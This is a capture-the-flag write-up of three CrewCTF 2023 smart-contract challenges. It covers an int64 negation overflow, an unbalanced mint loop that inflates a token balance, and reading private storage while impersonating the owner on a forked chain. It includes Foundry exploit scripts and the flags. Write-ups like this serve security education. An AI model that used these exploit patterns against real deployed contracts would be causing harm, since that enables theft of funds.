---
title: CrewCTF 2023
date: '2023-07-08'
draft: false
authors: ['yanhu']
tags: ['Crew CTF 2023', 'Web3', 'Blockchain', 'Smart Contract', 'Solidity']
canonical: 'https://yanhuijessica.github.io/Chictf-Writeups/blockchain/positive/'
summary: 'Web3 Writeup Compilation for CrewCTF 2023'
---

# positive

> Stay positive.
>
> `nc positive.chal.crewc.tf 60003`
>
> [Source](https://yanhuijessica.github.io/Chictf-Writeups/blockchain/positive/#description)

We need to find a number of type `int64` that is less than 0, and its opposite is also negative:

```js
function stayPositive(int64 _num) public returns(int64){
    int64 num;
    if(_num<0){
        num = -_num;
        if(num<0){
            solved = true;
        }
        return num;
    }
    num = _num;
    return num;
}
```

> If you have `int x = type(int).min;`, then `-x` does not fit the positive range. This means that `unchecked { assert(-x == x); }` works. [^1]

As `int64` type values range from $-9223372036854775808$ to $9223372036854775807$, the answer will be $-9223372036854775808$. During the competition, I used fuzzing to get the answer:

```js
contract PositiveTest is Test {
    Setup setup;
    Positive target;

    function setUp() public {
        setup = new Setup();
        target = setup.TARGET();
    }

    function testSolve(int64 a) public {
        target.stayPositive(a);
        assert(!target.solved());
    }
}
```

```bash
Failing tests:
Encountered 1 failing test in test/Positive.t.sol:PositiveTest
[FAIL. Reason: EvmError: InvalidFEOpcode Counterexample: calldata=0xecd6eb4fffffffffffffffffffffffffffffffffffffffffffffffff8000000000000000, args=[-9223372036854775808]] testSolve(int64) (runs: 66, μ: 8924, ~: 8925)
```

## Flag

`crew{9o5it1v1ty1sth3k3y}`

# infinite

> Infinite respect.
>
> `nc infinite.chal.crewc.tf 60001`
>
> [infinite.tar.gz](https://yanhuijessica.github.io/Chictf-Writeups/blockchain/static/infinite.tar.gz)

To solve the challenge, we need to store more than 50 respect tokens in the `fancyStore` contract.

```js
function isSolved() public view returns (bool) {
    return STORE.respectCount(CREW.receiver())>=50 ;
}
```

The `respectToken` and `candyToken` contracts do not contain any significant information, as they are simple ERC20 token contracts that allow the owner to call the `mint()` and `burn()` functions. The `crewToken` contract with a `mint()` function that can only be called once is the entry point.

```js
function mint() external {
    require(!claimed , "already claimed");
    receiver = msg.sender;
    claimed = true;
    _mint(receiver, 1);
}
```

Next, we can exchange 1 crew token for 10 candies:

```js
function verification() public payable{
    require(crew.balanceOf(msg.sender)==1, "You don't have crew tokens to verify");
    require(crew.allowance(msg.sender, address(this))==1, "You need to approve the contract to transfer crew tokens");

    crew.transferFrom(msg.sender, address(this), 1);

    candy.mint(msg.sender, 10);
}
```

The candy tokens can be exchanged for respect tokens through `fancyStore.sellCandies()` or `localGang.gainRespect()`. These two functions are slightly different. The `sellCandies()` function burns candy tokens and transfers the respect tokens stored in the contract to the `msg.sender`, while the `gainRespect()` function transfers the candy tokens from the `msg.sender` and **mint** respect tokens to msg.sender. Thus, the total supply of respect tokens can be increased through `gainRespect()`. Similarly, we can increase the total supply of candy tokens through `fancyStore.buyCandies()`.

Starting with 10 candy tokens, we can first exchange them for 10 respect tokens and increase `candyCount` through `localGang.gainRespect()`. Then, buy 10 candies and increase `respectCount` through `fancyStore.buyCandies()`. At this point, we have obtained an additional 10 candies and transferred 10 respect tokens to the `fancyStore` contract. Repeat these steps until `STORE.respectCount(CREW.receiver())` reaches the desired threshold.

## Script

```js
/// forge script script/Infinite.s.sol --private-key $PRIVATE_KEY --rpc-url $RPC_URL --sig "run(address)" $INSTANCE_ADDR --broadcast
contract InfiniteScript is Script {

    function run(address instance) public {
        vm.startBroadcast();
        Setup setup = Setup(instance);
        crewToken crew = setup.CREW();
        respectToken respect = setup.RESPECT();
        candyToken candy = setup.CANDY();
        fancyStore store = setup.STORE();
        localGang gang = setup.GANG();

        crew.mint();

        crew.approve(address(store), 1);
        store.verification();

        candy.approve(address(gang), 50);
        respect.approve(address(store), 50);
        for (uint i; i < 5; ++i) {
            gang.gainRespect(10);
            store.buyCandies(10);
        }
        vm.stopBroadcast();
    }
}
```

## Flag

`crew{inf1nt3_c4n9i3s_1nfinit3_r3s9ect}`

# deception

> Tate doesn't want you to know the truth. Find the secret.
>
> `nc deception.chal.crewc.tf 60002`
>
> [Source](https://yanhuijessica.github.io/Chictf-Writeups/blockchain/deception/#description)

From the source code, if we are able to provide a secret whose `keccak256` hash is equal to `0x65462b0520ef7d3df61b9992ed3bea0c56ead753be7c8b3614e0ce01e4cac41b`, then the challenge can be solved. The `keccak256` hash of "secret" is exactly what we want. However, when I called the `solve()` function with the argument "secret", the transaction kept reverting. I suddenly realized that the secret provided in the source code is not the actual value. So, I got the bytecode and attempted to extract the password from it.

It's not easy to get the secret even with decompiled bytecode:

```js
function password() public payable {
    require(msg.sender == _changeOwner, Error('Only owner can access'));
    v0 = _SafeExp(stor_1, stor_4);
    require(stor_2, Panic(18)); // division by zero
    if (76 - v0 % stor_2) {
        MEM[MEM[64] + 32] = v0 % stor_2;
        v1 = v2 = MEM[64] + 64;
    } else {
        require((stor_3 == stor_3 * (v0 % stor_2) / (v0 % stor_2)) | !(v0 % stor_2), Panic(17)); // arithmetic overflow or underflow
        require(v0 % stor_2, Panic(18)); // division by zero
        MEM[32 + MEM[64]] = stor_3 * (v0 % stor_2) / (v0 % stor_2);
        v3 = 0x18e(64 + MEM[64], 32, 30);
        v4 = _SafeAdd(0x616263, stor_3);
        v5 = _SafeSub(v4, stor_3);
        MEM[32 + MEM[64]] = v5;
        v6 = 0x18e(64 + MEM[64], 32, 30);
        v7 = v8 = 0;
        while (v7 < v3.length) {
            MEM[v7 + (32 + MEM[64])] = v3[v7];
            v7 += 32;
        }
        MEM[v3.length + (32 + MEM[64])] = 0;
        v9 = v10 = 0;
        while (v9 < v6.length) {
            MEM[v9 + (32 + MEM[64] + v3.length)] = v6[v9];
            v9 += 32;
        }
        MEM[v6.length + (32 + MEM[64] + v3.length)] = 0;
        v1 = v11 = v6.length + (32 + MEM[64] + v3.length);
    }
    v12 = new array[](v1 - MEM[64] - 32);
    v13 = v14 = 0;
    while (v13 < v1 - MEM[64] - 32) {
        MEM[v13 + v12.data] = MEM[v13 + (MEM[64] + 32)];
        v13 += 32;
    }
    MEM[v1 - MEM[64] - 32 + v12.data] = 0;
    return v12;
}
```

Why not just fork the chain and impersonate the owner to call the `password()` function?

```js
contract DeceptionTest is Test {
    Setup setup;
    deception target;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_URL"));
        setup = Setup(vm.envAddress("INSTANCE_ADDR"));
        target = setup.TARGET();
    }

    function testSolve() public {
        // address private owner;
        bytes32 slotValue = vm.load(address(target), 0);
        vm.prank(address(uint160(uint256(slotValue))));
        console.log("%s", target.password());
    }
}
```

Call the `solve()` function to complete the challenge after getting the actual secret :D

## Flag

`crew{d0nt_tru5t_wh4t_y0u_s3e_4s5_50urc3!}`

[^1]: [Addition, Subtraction and Multiplication](https://docs.soliditylang.org/en/latest/types.html#addition-subtraction-and-multiplication)
